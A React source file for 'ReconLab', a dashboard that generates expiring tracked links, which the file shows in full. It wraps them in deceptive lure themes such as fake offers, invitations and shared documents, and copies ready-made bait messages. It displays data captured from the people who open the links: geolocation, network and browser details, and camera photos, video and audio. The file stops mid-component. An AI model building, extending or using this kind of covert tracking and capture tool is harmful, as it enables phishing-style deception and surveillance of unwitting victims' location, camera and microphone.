import { useState, useEffect, useCallback, Fragment } from 'react';
import {
  Shield, Plus, RefreshCw, Copy, Download, XCircle, Eye, Clock,
  FileText, Image, Video, Link2, CheckCircle2, Globe, Monitor,
  Cpu, MapPin, Camera, Activity, ChevronRight, ExternalLink,
  Trash2,
} from 'lucide-react';
import {
  getStats, createUrl, listUrls, getUrlDetail, terminateUrl,
  exportCsv, getCapturedPhotoUrl, getCapturedVideoUrl, getCapturedAudioUrl,
} from '../lib/api';

// ─── Theme Definitions ────────────────────────────────────────────────────────
interface Theme {
  id: string;
  category: string;
  label: string;
  emoji: string;
  defaultCaption: string;
  linkText: string;
}

const THEMES: Theme[] = [
  { id: 'festival_offer',    category: 'Festival', label: 'Festival Offer',       emoji: '🎉', defaultCaption: 'Check out this special festival update below.',       linkText: 'View Offer'   },
  { id: 'festival_special',  category: 'Festival', label: 'Festival Special',     emoji: '🎊', defaultCaption: 'Something special is waiting for you.',               linkText: 'View Now'     },
  { id: 'festival_update',   category: 'Festival', label: 'Festival Update',      emoji: '🎆', defaultCaption: 'An important festival update is ready.',              linkText: 'See Update'   },
  { id: 'festival_celebrate',category: 'Festival', label: 'Festival Celebration', emoji: '🥳', defaultCaption: "Join in the celebration — see what's inside.",        linkText: 'Open'         },
  { id: 'special_offer',     category: 'Offers',   label: 'Special Offer',        emoji: '🔥', defaultCaption: 'An exclusive offer has been prepared for you.',       linkText: 'View Offer'   },
  { id: 'limited_offer',     category: 'Offers',   label: 'Limited Offer',        emoji: '⏳', defaultCaption: "This offer expires soon — don't miss it.",            linkText: 'Claim Now'    },
  { id: 'exclusive_offer',   category: 'Offers',   label: 'Exclusive Offer',      emoji: '💎', defaultCaption: "You've been selected for an exclusive offer.",        linkText: 'Open'         },
  { id: 'todays_offer',      category: 'Offers',   label: "Today's Offer",        emoji: '📦', defaultCaption: "Today's special offer is ready to view.",            linkText: 'View Today'   },
  { id: 'event_invite',      category: 'Events',   label: 'Event Invitation',     emoji: '📩', defaultCaption: 'You have been invited. See the details inside.',      linkText: 'View Invite'  },
  { id: 'event_update',      category: 'Events',   label: 'Event Update',         emoji: '📋', defaultCaption: 'An important event update is available.',             linkText: 'See Update'   },
  { id: 'event_info',        category: 'Events',   label: 'Event Information',    emoji: '📌', defaultCaption: 'Event information is ready for you.',                linkText: 'View Info'    },
  { id: 'event_announce',    category: 'Events',   label: 'Event Announcement',   emoji: '📢', defaultCaption: 'A new event announcement has been posted.',           linkText: 'Open'         },
  { id: 'shared_image',      category: 'Media',    label: 'Shared Image',         emoji: '🖼️', defaultCaption: 'An image has been shared with you.',                  linkText: 'View Image'   },
  { id: 'watch_video',       category: 'Media',    label: 'Watch This Video',     emoji: '🎬', defaultCaption: 'A video has been shared — tap to watch.',            linkText: 'Watch Now'    },
  { id: 'new_video',         category: 'Media',    label: 'New Video',            emoji: '📹', defaultCaption: 'A new video is ready to view.',                      linkText: 'Watch Now'    },
  { id: 'shared_doc',        category: 'Media',    label: 'Shared Document',      emoji: '📄', defaultCaption: 'A document has been shared with you.',               linkText: 'Open Doc'     },
  { id: 'important_update',  category: 'Updates',  label: 'Important Update',     emoji: '🔔', defaultCaption: 'An important update requires your attention.',       linkText: 'Read Now'     },
  { id: 'latest_update',     category: 'Updates',  label: 'Latest Update',        emoji: '📡', defaultCaption: 'The latest update is now available.',                linkText: 'View Update'  },
  { id: 'new_info',          category: 'Updates',  label: 'New Information',      emoji: 'ℹ️', defaultCaption: 'New information is available for you.',              linkText: 'Learn More'   },
  { id: 'check_this',        category: 'Updates',  label: 'Check This Out',       emoji: '👀', defaultCaption: 'Something worth seeing has been shared.',            linkText: 'Open'         },
  { id: 'custom',            category: 'Custom',   label: 'Custom',               emoji: '✏️', defaultCaption: '',                                                   linkText: 'Open'         },
];

const THEME_CATEGORIES = ['Festival', 'Offers', 'Events', 'Media', 'Updates', 'Custom'];

const DURATION_OPTIONS = [
  { label: '1 hour',   value: 1    },
  { label: '6 hours',  value: 6    },
  { label: '12 hours', value: 12   },
  { label: '24 hours', value: 24   },
  { label: '1 min (dev)', value: 1/60, dev: true },
];

// ─── Types ────────────────────────────────────────────────────────────────────
interface UrlItem {
  demoId: string;
  mediaType: string;
  contentUrl: string | null;
  theme: string;
  themeLabel: string;
  themeEmoji: string;
  themeCaption: string;
  themeLinkText: string;
  createdAt: string;
  expiresAt: string;
  status: string;
  visitCount: number;
  durationHours: number;
}

interface Stats {
  activeUrls: number;
  visitors: number;
  visits: number;
  expiringSoon: number;
}

// ─── Helpers ──────────────────────────────────────────────────────────────────
function formatDate(iso: string) {
  return new Date(iso).toLocaleString(undefined, { dateStyle: 'short', timeStyle: 'short' });
}

function timeRemaining(expiresAt: string): string {
  const diff = new Date(expiresAt).getTime() - Date.now();
  if (diff <= 0) return 'Expired';
  const mins = Math.floor(diff / 60000);
  if (mins < 60) return `${mins}m`;
  const hours = Math.floor(mins / 60);
  const rem = mins % 60;
  return rem > 0 ? `${hours}h ${rem}m` : `${hours}h`;
}

function visitorUrl(demoId: string): string {
  return `${window.location.origin}/r/${demoId}`;
}

function buildCopyMessage(item: UrlItem): string {
  const url = visitorUrl(item.demoId);
  return `${item.themeEmoji} ${item.themeLabel}\n\n${item.themeCaption}\n\n${url}`;
}

const MEDIA_ICONS: Record<string, any> = { image: Image, pdf: FileText, video: Video };

// ─── Main Component ───────────────────────────────────────────────────────────
export default function Dashboard() {
  const [urls, setUrls] = useState<UrlItem[]>([]);
  const [stats, setStats] = useState<Stats>({ activeUrls: 0, visitors: 0, visits: 0, expiringSoon: 0 });
  const [loading, setLoading] = useState(true);
  const [showWizard, setShowWizard] = useState(false);
  const [selectedDetail, setSelectedDetail] = useState<any>(null);
  const [toast, setToast] = useState<{ msg: string; type: 'success' | 'error' } | null>(null);
  const [error, setError] = useState('');

  const showToast = (msg: string, type: 'success' | 'error' = 'success') => {
    setToast({ msg, type });
    setTimeout(() => setToast(null), 3000);
  };

  const loadData = useCallback(async () => {
    try {
      const [urlData, statsData] = await Promise.all([listUrls(), getStats()]);
      setUrls(urlData);
      setStats(statsData);
      setError('');
    } catch {
      setError('Failed to load data');
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    loadData();
    const interval = setInterval(loadData, 5000);
    return () => clearInterval(interval);
  }, [loadData]);

  const handleTerminate = async (id: string) => {
    if (!confirm('Terminate this URL? All collected information will be deleted.')) return;
    try {
      await terminateUrl(id);
      await loadData();
      if (selectedDetail?.demoId === id) setSelectedDetail(null);
      showToast('URL terminated');
    } catch {
      showToast('Failed to terminate', 'error');
    }
  };

  const handleExportCsv = async (id: string) => {
    try {
      const csv = await exportCsv(id);
      const blob = new Blob([csv], { type: 'text/csv' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url; a.download = `reconlab_${id}.csv`; a.click();
      URL.revokeObjectURL(url);
      showToast('CSV exported');
    } catch {
      showToast('Export failed', 'error');
    }
  };

  const handleCopyUrl = (item: UrlItem) => {
    navigator.clipboard.writeText(visitorUrl(item.demoId));
    showToast('URL copied to clipboard');
  };

  const handleCopyMessage = (item: UrlItem) => {
    navigator.clipboard.writeText(buildCopyMessage(item));
    showToast('Message copied to clipboard');
  };

  const handleViewDetail = async (id: string) => {
    try {
      const data = await getUrlDetail(id);
      setSelectedDetail(data);
    } catch {
      showToast('Failed to load details', 'error');
    }
  };

  const activeUrls = urls.filter(u => u.status === 'active' || u.status === 'visited');
  const allUrls = urls;

  return (
    <div className="min-h-screen" style={{ background: 'var(--color-bg-primary)' }}>
      {/* Header */}
      <header style={{ background: 'var(--color-bg-secondary)', borderBottom: '1px solid var(--color-border)' }}>
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="logo-ring-sm">
              <Shield size={18} className="text-white" />
            </div>
            <div>
              <span className="text-lg font-bold tracking-tight">
                Recon<span style={{ color: 'var(--color-cyber-blue)' }}>Lab</span>
              </span>
              <span className="ml-3 text-xs" style={{ color: 'var(--color-text-muted)' }}>
                Information Gathering
              </span>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button onClick={loadData} className="btn btn-ghost" title="Refresh">
              <RefreshCw size={15} />
            </button>
            {allUrls.length > 0 && (
              <button onClick={() => setShowWizard(true)} className="btn btn-primary" id="generate-url-btn">
                <Plus size={15} /> Generate URL
              </button>
            )}
          </div>
        </div>
        <div className="glow-line" />
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 py-6">
        {error && (
          <div className="mb-4 p-3 rounded-lg text-sm flex items-center justify-between"
            style={{ background: 'rgba(239,68,68,0.08)', color: 'var(--color-danger)', border: '1px solid rgba(239,68,68,0.2)' }}>
            {error}
            <button onClick={() => setError('')} className="ml-2 opacity-60 hover:opacity-100">✕</button>
          </div>
        )}

        {/* Empty / Hero State */}
        {!loading && allUrls.length === 0 && (
          <div className="hero-section">
            <div className="hero-bg-grid" />
            <div className="hero-glow" />
            <div className="relative z-10 flex flex-col items-center gap-6">
              <div className="logo-ring">
                <Shield size={36} className="text-white" />
              </div>
              <div>
                <h1 className="text-4xl font-bold tracking-tight mb-2">
                  Recon<span style={{ color: 'var(--color-cyber-blue)' }}>Lab</span>
                </h1>
                <p style={{ color: 'var(--color-text-muted)' }} className="text-lg">Information Gathering</p>
              </div>
              <div style={{ color: 'var(--color-text-secondary)', maxWidth: '420px', textAlign: 'center', fontSize: '0.95rem', lineHeight: 1.7 }}>
                Generate a tracked URL, share it, and collect detailed visitor information in real time.
              </div>
              <button
                onClick={() => setShowWizard(true)}
                className="btn-primary-lg"
                id="hero-generate-btn"
              >
                <Plus size={22} /> Generate URL
              </button>
            </div>
          </div>
        )}

        {/* Dashboard State */}
        {(!loading && allUrls.length > 0) && (
          <div className="space-y-6">
            {/* Stats */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              <StatCard label="Active URLs" value={stats.activeUrls} icon={<Link2 size={18} />} color="blue" />
              <StatCard label="Visitors"    value={stats.visitors}   icon={<Eye size={18} />}   color="green" />
              <StatCard label="Visits"      value={stats.visits}     icon={<Activity size={18} />} color="cyan" />
              <StatCard label="Expiring Soon" value={stats.expiringSoon} icon={<Clock size={18} />} color="amber" />
            </div>

            {/* URL Table */}
            <div className="card" style={{ padding: 0, overflow: 'hidden' }}>
              <div className="px-5 py-4 flex items-center justify-between" style={{ borderBottom: '1px solid var(--color-border)' }}>
                <h2 className="font-semibold flex items-center gap-2">
                  <Link2 size={16} style={{ color: 'var(--color-accent)' }} />
                  Generated URLs
                  <span className="badge badge-active">{activeUrls.length} active</span>
                </h2>
              </div>
              {loading ? (
                <div className="empty-state">Loading…</div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="data-table">
                    <thead>
                      <tr>
                        <th>URL</th>
                        <th>Content</th>
                        <th>Theme</th>
                        <th>Created</th>
                        <th>Expires</th>
                        <th>Visits</th>
                        <th>Status</th>
                        <th>Actions</th>
                      </tr>
                    </thead>
                    <tbody>
                      {allUrls.map(item => {
                        const Icon = MEDIA_ICONS[item.mediaType] || FileText;
                        const isActive = item.status === 'active' || item.status === 'visited';
                        return (
                          <tr key={item.demoId}>
                            <td>
                              <span className="font-mono text-xs" style={{ color: 'var(--color-cyber-blue)' }}>
                                /r/{item.demoId.substring(0, 8)}…
                              </span>
                            </td>
                            <td>
                              <span className="flex items-center gap-1.5 text-sm">
                                <Icon size={13} style={{ color: 'var(--color-accent)' }} />
                                <span style={{ textTransform: 'capitalize' }}>{item.mediaType}</span>
                              </span>
                            </td>
                            <td className="text-sm">
                              <span>{item.themeEmoji} {item.themeLabel}</span>
                            </td>
                            <td className="text-xs" style={{ color: 'var(--color-text-muted)' }}>
                              {formatDate(item.createdAt)}
                            </td>
                            <td className="text-xs">
                              {isActive
                                ? <span style={{ color: timeRemaining(item.expiresAt) === 'Expired' ? 'var(--color-danger)' : 'var(--color-warning)' }}>
                                    {timeRemaining(item.expiresAt)}
                                  </span>
                                : <span style={{ color: 'var(--color-text-muted)' }}>—</span>
                              }
                            </td>
                            <td className="text-sm font-semibold">
                              {item.visitCount}
                            </td>
                            <td>
                              <span className={`badge badge-${item.status}`}>{item.status}</span>
                            </td>
                            <td>
                              <div className="flex items-center gap-1">
                                <button onClick={() => handleViewDetail(item.demoId)} className="btn btn-ghost" style={{ padding: '0.3rem' }} title="Details">
                                  <Eye size={14} />
                                </button>
                                {isActive && (
                                  <>
                                    <button onClick={() => window.open(`/r/${item.demoId}`, '_blank')} className="btn btn-ghost" style={{ padding: '0.3rem' }} title="Open URL">
                                      <ExternalLink size={14} />
                                    </button>
                                    <button onClick={() => handleCopyUrl(item)} className="btn btn-ghost" style={{ padding: '0.3rem' }} title="Copy URL">
                                      <Copy size={14} />
                                    </button>
                                    <button onClick={() => handleCopyMessage(item)} className="btn btn-ghost" style={{ padding: '0.3rem' }} title="Copy Message">
                                      <FileText size={14} />
                                    </button>
                                    <button onClick={() => handleExportCsv(item.demoId)} className="btn btn-ghost" style={{ padding: '0.3rem' }} title="Export CSV">
                                      <Download size={14} />
                                    </button>
                                    <button onClick={() => handleTerminate(item.demoId)} className="btn btn-ghost" style={{ padding: '0.3rem', color: 'var(--color-danger)' }} title="Terminate">
                                      <Trash2 size={14} />
                                    </button>
                                  </>
                                )}
                              </div>
                            </td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          </div>
        )}
      </main>

      {/* Wizard Modal */}
      {showWizard && (
        <WizardModal
          onClose={() => setShowWizard(false)}
          onCreated={() => { loadData(); setShowWizard(false); }}
          showToast={showToast}
        />
      )}

      {/* Detail Modal */}
      {selectedDetail && (
        <DetailModal
          session={selectedDetail}
          onClose={() => setSelectedDetail(null)}
          onTerminate={handleTerminate}
          onExportCsv={handleExportCsv}
          onCopyUrl={(id) => handleCopyUrl(allUrls.find(u => u.demoId === id)!)}
          onCopyMessage={(id) => handleCopyMessage(allUrls.find(u => u.demoId === id)!)}
        />
      )}

      {/* Toast */}
      {toast && (
        <div className={`toast ${toast.type === 'success' ? 'toast-success' : 'toast-error'}`}>
          {toast.type === 'success'
            ? <CheckCircle2 size={16} style={{ color: 'var(--color-success)', flexShrink: 0 }} />
            : <XCircle size={16} style={{ color: 'var(--color-danger)', flexShrink: 0 }} />
          }
          {toast.msg}
        </div>
      )}
    </div>
  );
}

// ─── Stat Card ────────────────────────────────────────────────────────────────
function StatCard({ label, value, icon, color }: { label: string; value: number; icon: React.ReactNode; color: string }) {
  const colorMap: Record<string, { text: string; bg: string }> = {
    blue:  { text: 'var(--color-accent)',   bg: 'rgba(59, 130, 246, 0.1)' },
    green: { text: 'var(--color-success)',  bg: 'rgba(16, 185, 129, 0.1)' },
    cyan:  { text: 'var(--color-info)',     bg: 'rgba(6, 182, 212, 0.1)'  },
    amber: { text: 'var(--color-warning)',  bg: 'rgba(245, 158, 11, 0.1)' },
  };
  const c = colorMap[color];
  return (
    <div className={`stat-card stat-card-${color}`}>
      <div className="flex items-center justify-between mb-3">
        <span className="text-sm font-medium" style={{ color: 'var(--color-text-muted)' }}>{label}</span>
        <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ background: c.bg, color: c.text }}>
          {icon}
        </div>
      </div>
      <div className="stat-value" style={{ color: c.text }}>{value}</div>
    </div>
  );
}

// ─── Wizard Modal ─────────────────────────────────────────────────────────────
function WizardModal({ onClose, onCreated, showToast }: {
  onClose: () => void;
  onCreated: () => void;
  showToast: (msg: string, type?: 'success' | 'error') => void;
}) {
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [mediaType, setMediaType] = useState<'image' | 'video' | 'pdf'>('image');
  const [contentUrl, setContentUrl] = useState('');
  const [pdfFile, setPdfFile] = useState<File | null>(null);
  const [imagePreviewOk, setImagePreviewOk] = useState(false);
  const [selectedTheme, setSelectedTheme] = useState<Theme | null>(null);
  const [themeCaption, setThemeCaption] = useState('');
  const [customTitle, setCustomTitle] = useState('');
  const [customLinkText, setCustomLinkText] = useState('Open');
  const [themeCategory, setThemeCategory] = useState('Festival');
  const [duration, setDuration] = useState(24);
  const [creating, setCreating] = useState(false);
  const [createdResult, setCreatedResult] = useState<any>(null);
  const [copyState, setCopyState] = useState<'url' | 'msg' | null>(null);

  const handleCreate = async () => {
    setCreating(true);
    try {
      const formData = new FormData();
      formData.append('mediaType', mediaType);
      formData.append('durationHours', String(duration));
      if (mediaType !== 'pdf') {
        formData.append('contentUrl', contentUrl);
      } else if (pdfFile) {
        formData.append('media', pdfFile);
      }
      const theme = selectedTheme!;
      formData.append('theme', theme.id);
      formData.append('themeLabel', theme.id === 'custom' ? customTitle : theme.label);
      formData.append('themeCaption', themeCaption);
      formData.append('themeLinkText', theme.id === 'custom' ? customLinkText : theme.linkText);
      formData.append('themeEmoji', theme.emoji);

      const result = await createUrl(formData);
      setCreatedResult(result);
      setStep(3);
    } catch (err: any) {
      showToast(err.message || 'Failed to create URL', 'error');
    } finally {
      setCreating(false);
    }
  };

  const copyUrl = () => {
    const url = `${window.location.origin}/r/${createdResult.demoId}`;
    navigator.clipboard.writeText(url);
    setCopyState('url');
    setTimeout(() => setCopyState(null), 2000);
  };

  const copyMessage = () => {
    const url = `${window.location.origin}/r/${createdResult.demoId}`;
    const theme = selectedTheme!;
    const label = theme.id === 'custom' ? customTitle : theme.label;
    const msg = `${theme.emoji} ${label}\n\n${themeCaption}\n\n${url}`;
    navigator.clipboard.writeText(msg);
    setCopyState('msg');
    setTimeout(() => setCopyState(null), 2000);
  };

  const canGoToStep2 = () => {
    if (mediaType === 'pdf') return !!pdfFile;
    return contentUrl.startsWith('http') && imagePreviewOk;
  };

  const canCreate = () => {
    if (!selectedTheme) return false;
    if (selectedTheme.id === 'custom' && !customTitle.trim()) return false;
    return true;
  };

  const stepLabels = ['Choose Content', 'Choose Theme', 'URL Ready'];

  return (
    <div className="modal-overlay" onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-panel animate-slide-up">
        {/* Wizard Header */}
        <div className="px-6 pt-6 pb-4" style={{ borderBottom: '1px solid var(--color-border)' }}>
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-semibold">Create URL</h2>
            <button onClick={onClose} className="btn btn-ghost" style={{ padding: '0.375rem' }}>
              <XCircle size={18} />
            </button>
          </div>
          {/* Step indicator */}
          <div className="flex items-center gap-2">
            {[1, 2, 3].map(s => (
              <Fragment key={s}>
                <div className={`step-dot ${step === s ? 'active' : step > s ? 'done' : ''}`}>
                  {step > s ? <CheckCircle2 size={14} /> : s}
                </div>
                {s < 3 && <div className={`step-line ${step > s ? 'done' : ''}`} style={{ flex: 1 }} />}
              </Fragment>
            ))}
            <span className="ml-3 text-sm" style={{ color: 'var(--color-text-muted)' }}>{stepLabels[step - 1]}</span>
          </div>
        </div>

        <div className="p-6">
          {/* ─ Step 1: Content Selection ─ */}
          {step === 1 && (
            <div className="space-y-6 animate-fade-in">
              {/* Content type cards */}
              <div className="grid grid-cols-3 gap-3">
                {[
                  { type: 'image' as const, icon: '🖼️', label: 'Image', desc: 'Paste an image URL' },
                  { type: 'video' as const, icon: '🎬', label: 'Video', desc: 'Paste a video URL' },
                  { type: 'pdf'   as const, icon: '📄', label: 'PDF',   desc: 'Upload a PDF file' },
                ].map(opt => (
                  <div
                    key={opt.type}
                    className={`content-type-card ${mediaType === opt.type ? 'selected' : ''}`}
                    onClick={() => { setMediaType(opt.type); setContentUrl(''); setPdfFile(null); setImagePreviewOk(false); }}
                    id={`content-type-${opt.type}`}
                  >
                    <div className="content-type-icon" style={{ background: mediaType === opt.type ? 'rgba(59,130,246,0.12)' : 'rgba(30,58,95,0.3)' }}>
                      {opt.icon}
                    </div>
                    <div className="font-semibold text-sm mb-0.5">{opt.label}</div>
                    <div className="text-xs" style={{ color: 'var(--color-text-muted)' }}>{opt.desc}</div>
                  </div>
                ))}
              </div>

              {/* Content Input */}
              {(mediaType === 'image' || mediaType === 'video') && (
                <div className="space-y-3 animate-fade-in">
                  <label className="block text-sm font-medium" style={{ color: 'var(--color-text-secondary)' }}>
                    Paste {mediaType === 'image' ? 'image' : 'video'} URL
                  </label>
                  <input
                    type="url"
                    className="input-field"
                    placeholder={`https://example.com/${mediaType === 'image' ? 'image.jpg' : 'video.mp4'}`}
                    value={contentUrl}
                    onChange={e => { setContentUrl(e.target.value); setImagePreviewOk(false); }}
                    id="content-url-input"
                  />
                  {contentUrl.startsWith('http') && mediaType === 'image' && (
                    <div className="rounded-lg overflow-hidden" style={{ background: 'var(--color-bg-input)', border: '1px solid var(--color-border)', maxHeight: '200px' }}>
                      <img
                        src={contentUrl}
                        alt="Preview"
                        className="w-full object-contain"
                        style={{ maxHeight: '200px' }}
                        onLoad={() => setImagePreviewOk(true)}
                        onError={() => setImagePreviewOk(false)}
                      />
                    </div>
                  )}
                  {contentUrl.startsWith('http') && mediaType === 'video' && (
                    <div className="rounded-lg overflow-hidden" style={{ background: '#000', border: '1px solid var(--color-border)' }}>
                      <video
                        src={contentUrl}
                        controls
                        className="w-full"
                        style={{ maxHeight: '200px' }}
                        onLoadedData={() => setImagePreviewOk(true)}
                        onError={() => setImagePreviewOk(false)}
                      />
                    </div>
                  )}
                </div>
              )}

              {mediaType === 'pdf' && (
                <div className="space-y-3 animate-fade-in">
                  <label className="block text-sm font-medium" style={{ color: 'var(--color-text-secondary)' }}>
                    Upload PDF
                  </label>
                  <input
                    type="file"
                    accept=".pdf,application/pdf"
                    className="input-field"
                    onChange={e => setPdfFile(e.target.files?.[0] || null)}
                    id="pdf-file-input"
                  />
                  {pdfFile && (
                    <div className="card-inset flex items-center gap-3 animate-fade-in">
                      <FileText size={24} style={{ color: 'var(--color-accent)', flexShrink: 0 }} />
                      <div>
                        <div className="text-sm font-medium">{pdfFile.name}</div>
                        <div className="text-xs" style={{ color: 'var(--color-text-muted)' }}>
                          {(pdfFile.size / 1024).toFixed(1)} KB
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              )}

              {/* Duration */}
              <div>
                <label className="block text-sm font-medium mb-2" style={{ color: 'var(--color-text-secondary)' }}>
                  Expiration
                </label>
                <div className="flex flex-wrap gap-2">
                  {DURATION_OPTIONS.map(opt => (
                    <button
                      key={opt.value}
                      onClick={() => setDuration(opt.value)}
                      className={`btn ${duration === opt.value ? 'btn-primary' : 'btn-outline'}`}
                      style={{ fontSize: '0.8rem', padding: '0.4rem 0.875rem' }}
                    >
                      {opt.label}
                    </button>
                  ))}
                </div>
              </div>

              <div className="flex justify-end">
                <button
                  onClick={() => setStep(2)}
                  disabled={!canGoToStep2()}
                  className="btn btn-primary"
                  id="wizard-next-btn"
                >
                  Continue <ChevronRight size={16} />
                </button>
              </div>
            </div>
          )}

          {/* ─ Step 2: Theme Selection ─ */}
          {step === 2 && (
            <div className="space-y-4 animate-fade-in">
              {/* Category tabs */}
              <div className="flex flex-wrap gap-2">
                {THEME_CATEGORIES.map(cat => (
                  <button
                    key={cat}
                    onClick={() => setThemeCategory(cat)}
                    className={`btn ${themeCategory === cat ? 'btn-primary' : 'btn-outline'}`}
                    style={{ fontSize: '0.8rem', padding: '0.35rem 0.875rem' }}
                  >
                    {cat}
                  </button>
                ))}
              </div>

              {/* Theme grid */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 max-h-64 overflow-y-auto pr-1">
                {THEMES.filter(t => t.category === themeCategory).map(theme => (
                  <div
                    key={theme.id}
                    className={`theme-card ${selectedTheme?.id === theme.id ? 'selected' : ''}`}
                    onClick={() => {
                      setSelectedTheme(theme);
                      setThemeCaption(theme.defaultCaption);
                    }}
                    id={`theme-${theme.id}`}
                  >
                    <span className="text-xl">{theme.emoji}</span>
                    <div>
                      <div className="text-sm font-medium">{theme.label}</div>
                      <div className="text-xs" style={{ color: 'var(--color-text-muted)' }} >{theme.linkText}</div>
                    </div>
                    {selectedTheme?.id === theme.id && (
                      <CheckCircle2 size={14} className="ml-auto" style={{ color: 'var(--color-accent)', flexShrink: 0 }} />
                    )}
                  </div>
                ))}
              </div>

              {/* Custom theme inputs */}
              {selectedTheme?.id === 'custom' && (
                <div className="grid grid-cols-2 gap-3 animate-fade-in">
                  <div>
                    <label className="block text-xs font-medium mb-1" style={{ color: 'var(--color-text-muted)' }}>Title</label>
                    <input type="text" className="input-field" placeholder="Your custom title" value={customTitle} onChange={e => setCustomTitle(e.target.value)} />
                  </div>
                  <div>
                    <label className="block text-xs font-medium mb-1" style={{ color: 'var(--color-text-muted)' }}>Link Text</label>
                    <input type="text" className="input-field" placeholder="Open" value={customLinkText} onChange={e => setCustomLinkText(e.target.value)} />
                  </div>
                </div>
              )}

              {/* Caption editor */}
              {selectedTheme && (
                <div className="animate-fade-in">
                  <label className="block text-sm font-medium mb-2" style={{ color: 'var(--color-text-secondary)' }}>
                    Message Caption
                    <span className="ml-2 text-xs font-normal" style={{ color: 'var(--color-text-muted)' }}>(editable)</span>
                  </label>
                  <textarea
                    className="input-field"
                    rows={3}
                    value={themeCaption}
                    onChange={e => setThemeCaption(e.target.value)}
                    placeholder="Caption that will appear in the copied message..."
                    style={{ resize: 'vertical' }}
                  />
                  {/* Preview */}
                  <div className="card-inset mt-3" style={{ fontSize: '0.85rem' }}>
                    <div className="font-semibold mb-1">
                      {selectedTheme.emoji} {selectedTheme.id === 'custom' ? (customTitle || 'Your Title') : selectedTheme.label}
                    </div>
                    <div style={{ color: 'var(--color-text-secondary)', marginBottom: '0.5rem' }}>{themeCaption}</div>
                    <div className="inline-block px-3 py-1 rounded text-xs font-semibold" style={{ background: 'var(--color-accent)', color: 'white' }}>
                      {selectedTheme.id === 'custom' ? customLinkText : selectedTheme.linkText}
                    </div>
                  </div>
                </div>
              )}

              <div className="flex justify-between">
                <button onClick={() => setStep(1)} className="btn btn-outline">← Back</button>
                <button
                  onClick={handleCreate}
                  disabled={!canCreate() || creating}
                  className="btn btn-primary"
                  id="wizard-create-btn"
                >
                  {creating ? 'Generating…' : 'Generate URL'}
                </button>
              </div>
            </div>
          )}

          {/* ─ Step 3: URL Ready ─ */}
          {step === 3 && createdResult && (
            <div className="space-y-5 animate-fade-in">
              <div className="text-center py-2">
                <div className="text-4xl mb-3">✅</div>
                <h3 className="text-xl font-bold mb-1">URL Ready</h3>
                <p className="text-sm" style={{ color: 'var(--color-text-muted)' }}>
                  Share this URL to start collecting visitor information
                </p>
              </div>

              <div className="card-inset space-y-3">
                <div className="flex justify-between text-sm">
                  <span style={{ color: 'var(--color-text-muted)' }}>Content</span>
                  <span style={{ textTransform: 'capitalize' }}>{mediaType}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span style={{ color: 'var(--color-text-muted)' }}>Theme</span>
                  <span>{selectedTheme?.emoji} {selectedTheme?.id === 'custom' ? customTitle : selectedTheme?.label}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span style={{ color: 'var(--color-text-muted)' }}>Expiration</span>
                  <span>{DURATION_OPTIONS.find(d => d.value === duration)?.label}</span>
                </div>
              </div>

              <div>
                <div className="text-xs font-semibold mb-2" style={{ color: 'var(--color-text-muted)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                  Generated URL
                </div>
                <div className="url-chip">
                  <Link2 size={13} style={{ flexShrink: 0 }} />
                  <span className="truncate">{window.location.origin}/r/{createdResult.demoId}</span>
                </div>
              </div>

              <div className="grid grid-cols-3 gap-3">
                <button onClick={copyUrl} className="btn btn-primary" id="copy-url-btn">
                  {copyState === 'url' ? <CheckCircle2 size={15} /> : <Copy size={15} />}
                  {copyState === 'url' ? 'Copied!' : 'Copy URL'}
                </button>
                <button onClick={copyMessage} className="btn btn-outline" id="copy-message-btn">
                  {copyState === 'msg' ? <CheckCircle2 size={15} /> : <FileText size={15} />}
                  {copyState === 'msg' ? 'Copied!' : 'Copy Message'}
                </button>
                <button
                  onClick={() => window.open(`/r/${createdResult.demoId}`, '_blank')}
                  className="btn btn-outline"
                  id="open-url-btn"
                >
                  <ExternalLink size={15} /> Open
                </button>
              </div>

              <div className="flex justify-end">
                <button onClick={onCreated} className="btn btn-ghost">
                  Done
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ─── Detail Modal ─────────────────────────────────────────────────────────────
function DetailModal({ session, onClose, onTerminate, onExportCsv, onCopyUrl, onCopyMessage }: {
  session: any;
  onClose: () => void;
  onTerminate: (id: string) => void;
  onExportCsv: (id: string) => void;
  onCopyUrl: (id: string) => void;
  onCopyMessage: (id: string) => void;
}) {
  const n = session.networkInfo;
  const b = session.browserInfo;
  const g = session.geoInfo;
  const l = session.location;
  const isActive = session.status === 'active' || session.status === 'visited';

  const photoUrl = session.capturedPhotoRef ? getCapturedPhotoUrl(session.demoId) : null;
  const videoUrl = session.capturedVideoRef ? getCapturedVideoUrl(session.demoId) : null;
  const audioUrl = session.capturedAudioRef ? getCapturedAudioUrl(session.demoId) : null;

  return (
    <div className="modal-overlay" onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-panel modal-panel-lg animate-slide-up">
        {/* Header */}
        <div className="px-6 pt-5 pb-4 flex items-center justify-between" style={{ borderBottom: '1px solid var(--color-border)' }}>
          <div>
            <h2 className="text-lg font-semibold">Visitor Details</h2>
            <p className="text-xs font-mono mt-0.5" style={{ color: 'var(--color-text-muted)' }}>/r/{session.demoId}</p>
          </div>
          <div className="flex items-center gap-2">
            {isActive && (
              <>
                <button onClick={() => onCopyUrl(session.demoId)} className="btn btn-outline" style={{ fontSize: '0.8rem', padding: '0.4rem 0.75rem' }}>
                  <Copy size={13} /> URL
                </button>
                <button onClick={() => onCopyMessage(session.demoId)} className="btn btn-outline" style={{ fontSize: '0.8rem', padding: '0.4rem 0.75rem' }}>
